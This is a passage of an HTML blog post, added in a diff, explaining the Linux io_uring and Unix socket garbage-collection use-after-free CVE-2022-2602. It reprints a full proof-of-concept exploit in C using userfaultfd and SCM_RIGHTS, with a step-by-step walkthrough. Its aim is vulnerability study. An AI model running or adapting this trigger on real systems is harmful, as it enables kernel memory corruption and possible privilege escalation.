+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (ring<span style="color:#f92672">-&gt;</span>ring_fd <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">__sys_close</span>(ring<span style="color:#f92672">-&gt;</span>ring_fd); <span style="color:#75715e">// Decrementing ref_count
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>Then by triggering the garbage collector, the ring&rsquo;s <code>fd</code> with <code>inflight == refcount</code>, will be included in the <code>hitlist</code> which will free its queued files in <code>sbk</code> queue, thus, feering the registered file still in use -&gt; <strong>UAF</strong>.</p>
+<h2 id="cve-2022-2602">CVE-2022-2602</h2>
+<p>Thadeu Lima de Souza Cascardo reported a POC that looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// [...]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// [1]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">userfaultfd</span>(<span style="color:#66d9ef">int</span> flags)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">syscall</span>(__NR_userfaultfd, flags);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">4096</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">fault_manager</span>(<span style="color:#66d9ef">int</span> ufd)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> uffd_msg msg;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> uffdio_copy copy;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">read</span>(ufd, <span style="color:#f92672">&amp;</span>msg, <span style="color:#66d9ef">sizeof</span>(msg));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (msg.event <span style="color:#f92672">!=</span> UFFD_EVENT_PAGEFAULT)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">err</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;event not pagefault&#34;</span>);
+</span></span><span style="display:flex;"><span>	copy.dst <span style="color:#f92672">=</span> msg.arg.pagefault.address;
+</span></span><span style="display:flex;"><span>	copy.src <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>) buffer;
+</span></span><span style="display:flex;"><span>	copy.len <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>;
+</span></span><span style="display:flex;"><span>	copy.mode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	copy.copy <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ioctl</span>(ufd, UFFDIO_COPY, <span style="color:#f92672">&amp;</span>copy);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(ufd);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>bogus;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">start_ufd</span>(<span style="color:#66d9ef">int</span> ufd)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> uffdio_api api;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> uffdio_register reg;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	bogus <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(NULL, <span style="color:#ae81ff">4096</span>, PROT_READ, MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	api.api <span style="color:#f92672">=</span> UFFD_API;
+</span></span><span style="display:flex;"><span>	api.features <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	api.ioctls <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ioctl</span>(ufd, UFFDIO_API, <span style="color:#f92672">&amp;</span>api);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	reg.range.start <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>) bogus;
+</span></span><span style="display:flex;"><span>	reg.range.len <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>;
+</span></span><span style="display:flex;"><span>	reg.mode <span style="color:#f92672">=</span> UFFDIO_REGISTER_MODE_MISSING;
+</span></span><span style="display:flex;"><span>	reg.ioctls <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ioctl</span>(ufd, UFFDIO_REGISTER, <span style="color:#f92672">&amp;</span>reg);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sendfd</span>(<span style="color:#66d9ef">int</span> s, <span style="color:#66d9ef">int</span> fd)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> msghdr msg;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">4096</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> cmsghdr <span style="color:#f92672">*</span>cmsg;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> fds[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> { fd };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	msg.msg_control <span style="color:#f92672">=</span> buf;
+</span></span><span style="display:flex;"><span>	msg.msg_controllen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	cmsg <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_FIRSTHDR</span>(<span style="color:#f92672">&amp;</span>msg);
+</span></span><span style="display:flex;"><span>	cmsg<span style="color:#f92672">-&gt;</span>cmsg_level <span style="color:#f92672">=</span> SOL_SOCKET;
+</span></span><span style="display:flex;"><span>	cmsg<span style="color:#f92672">-&gt;</span>cmsg_type <span style="color:#f92672">=</span> SCM_RIGHTS;
+</span></span><span style="display:flex;"><span>	cmsg<span style="color:#f92672">-&gt;</span>cmsg_len <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_LEN</span>(<span style="color:#66d9ef">sizeof</span>(fds));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memcpy</span>(<span style="color:#a6e22e">CMSG_DATA</span>(cmsg), fds, <span style="color:#66d9ef">sizeof</span>(fds));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	msg.msg_controllen <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_SPACE</span>(<span style="color:#66d9ef">sizeof</span>(fds));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sendmsg</span>(s, <span style="color:#f92672">&amp;</span>msg, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// [...]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">prepare_request</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">struct</span> io_uring_params <span style="color:#f92672">*</span>params, <span style="color:#66d9ef">struct</span> io_uring <span style="color:#f92672">*</span>ring)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> io_uring_sqe <span style="color:#f92672">*</span>sqe;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_uring_queue_mmap</span>(fd, params, ring);
+</span></span><span style="display:flex;"><span>	sqe <span style="color:#f92672">=</span> <span style="color:#a6e22e">io_uring_get_sqe</span>(ring);
+</span></span><span style="display:flex;"><span>	sqe<span style="color:#f92672">-&gt;</span>opcode <span style="color:#f92672">=</span> IORING_OP_WRITEV;
+</span></span><span style="display:flex;"><span>	sqe<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	sqe<span style="color:#f92672">-&gt;</span>addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>) bogus;
+</span></span><span style="display:flex;"><span>	sqe<span style="color:#f92672">-&gt;</span>len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	sqe<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">=</span> IOSQE_FIXED_FILE;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ufd;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">pid_t</span> manager;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> io_uring ring;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> fd;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> io_uring_params <span style="color:#f92672">*</span>params;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> rfd[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> s[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> backup_fd;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> iovec <span style="color:#f92672">*</span>iov;
+</span></span><span style="display:flex;"><span>	iov <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) buffer;
+</span></span><span style="display:flex;"><span>	iov<span style="color:#f92672">-&gt;</span>iov_base <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hello, world!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>	iov<span style="color:#f92672">-&gt;</span>iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">14</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ufd <span style="color:#f92672">=</span> <span style="color:#a6e22e">userfaultfd</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ufd <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">err</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;userfaultfd&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">start_ufd</span>(ufd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((manager <span style="color:#f92672">=</span> <span style="color:#a6e22e">fork</span>()) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fault_manager</span>(ufd);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(ufd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">socketpair</span>(AF_UNIX, SOCK_DGRAM, <span style="color:#ae81ff">0</span>, s);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	params <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>params));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(params, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>params));
+</span></span><span style="display:flex;"><span>	params<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">=</span> IORING_SETUP_SQPOLL;
+</span></span><span style="display:flex;"><span>	fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">io_uring_setup</span>(<span style="color:#ae81ff">32</span>, params);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	rfd[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> s[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>	rfd[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;null&#34;</span>, O_RDWR <span style="color:#f92672">|</span> O_CREAT <span style="color:#f92672">|</span> O_TRUNC, <span style="color:#ae81ff">0644</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_uring_register</span>(fd, IORING_REGISTER_FILES, rfd, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(rfd[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sendfd</span>(s[<span style="color:#ae81ff">0</span>], fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(s[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(s[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">prepare_request</span>(fd, params, <span style="color:#f92672">&amp;</span>ring);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_uring_submit</span>(<span style="color:#f92672">&amp;</span>ring);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_uring_queue_exit</span>(<span style="color:#f92672">&amp;</span>ring);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(<span style="color:#a6e22e">socket</span>(AF_UNIX, SOCK_DGRAM, <span style="color:#ae81ff">0</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wait</span>(NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wait</span>(NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>} 
+</span></span></code></pre></div><p>This POC does exactly what i have described in the last section.</p>
+<p><strong>Step 1</strong> : It setups a page fault handler with <strong>userfaultfd</strong> in order to pause a thread and give time for the race condition</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	ufd <span style="color:#f92672">=</span> <span style="color:#a6e22e">userfaultfd</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ufd <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">err</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;userfaultfd&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">start_ufd</span>(ufd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((manager <span style="color:#f92672">=</span> <span style="color:#a6e22e">fork</span>()) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fault_manager</span>(ufd);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(ufd);
+</span></span></code></pre></div><p><strong>Step 2</strong> : Initates a io_uring context, creates a socketpair and opens a random file, and registers them in the ring&rsquo;s context.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#a6e22e">socketpair</span>(AF_UNIX, SOCK_DGRAM, <span style="color:#ae81ff">0</span>, s);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	params <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>params));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(params, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>params));
+</span></span><span style="display:flex;"><span>	params<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">=</span> IORING_SETUP_SQPOLL;
+</span></span><span style="display:flex;"><span>	fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">io_uring_setup</span>(<span style="color:#ae81ff">32</span>, params);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	rfd[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> s[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>	rfd[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;null&#34;</span>, O_RDWR <span style="color:#f92672">|</span> O_CREAT <span style="color:#f92672">|</span> O_TRUNC, <span style="color:#ae81ff">0644</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_uring_register</span>(fd, IORING_REGISTER_FILES, rfd, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(rfd[<span style="color:#ae81ff">1</span>]);
+</span></span></code></pre></div><p><strong>Step 3</strong> : Sending the ring&rsquo;s fd from s[0] to s[1]. This puts the ring&rsquo;s <code>struct file</code> into <code>s[1]</code>&rsquo;s receiving queue. <br>
+This will make this file-&gt;f_count increase by, and its <code>inflight</code> by one, thus having <code>f_count</code> = 2 and <code>inflight = 1</code>. <br>
+At last, closing both sockets before accepting the sent fd, which would decrement ref_count and inflight to 1 and 0 respectively. But, this step makes file&rsquo;s <code>refcount</code> and <code>inflight</code> stay at 2 and 1.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#a6e22e">sendfd</span>(s[<span style="color:#ae81ff">0</span>], fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(s[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(s[<span style="color:#ae81ff">1</span>]);
+</span></span></code></pre></div><p><strong>Step 4</strong> : Sumbitting a write request into the registered file, with a zero-page demand as source. This will cause a pagefault which handled with <strong>userfaultfd</strong> as mentionned. <br>
+and <code>io_uring_queue_exit</code> will decrease the refcount of ring&rsquo;s file to 1, thus having its <code>f_count == inflight == 1</code> which makes it a candidate for the garbage collector.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#a6e22e">prepare_request</span>(fd, params, <span style="color:#f92672">&amp;</span>ring);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_uring_submit</span>(<span style="color:#f92672">&amp;</span>ring);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_uring_queue_exit</span>(<span style="color:#f92672">&amp;</span>ring);
+</span></span></code></pre></div><p><strong>Step 5</strong> : Triggering the GC <br>
+The GC can be triggered in two ways:</p>
+<ul>
+<li><code>wait_for_unix_gc</code> is invoked at the beginning of the <code>sendmsg</code> function if there are more than 16,000 inflight sockets.</li>
+<li>When a socket file is released by the kernel (i.e., a file descriptor is closed), the kernel will directly invoke <code>unix_gc</code>.</li>
+</ul>
+<p>So, here, the second options is chosen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(<span style="color:#a6e22e">socket</span>(AF_UNIX, SOCK_DGRAM, <span style="color:#ae81ff">0</span>));
+</span></span></code></pre></div><p>For this vulnerabilty, an exploit already exists using <code>usefauldfd</code>. As i said in the beginning, i am working on an alternative one using <strong>FUSE</strong> which i am hopefully releasing soon.</p>
+<h2 id="resources">Resources</h2>
+<p><a href="https://exploiter.dev/blog/2022/CVE-2022-2602.html">https://exploiter.dev/blog/2022/CVE-2022-2602.html</a> <br>
+<a href="https://man7.org/linux/man-pages/man7/io_uring.7.html">https://man7.org/linux/man-pages/man7/io_uring.7.html</a> <br>
+<a href="https://kernel.dk/io_uring.pdf">https://kernel.dk/io_uring.pdf</a> <br>
+<a href="https://seclists.org/oss-sec/2022/q4/57?utm_source=dlvr.it&amp;utm_medium=twitter">https://seclists.org/oss-sec/2022/q4/57?utm_source=dlvr.it&amp;utm_medium=twitter</a></p>
+
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+
+    
+    
+    
+</div>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+
+    
+
+    
+
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/gokarna-theme/gokarna-hugo">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
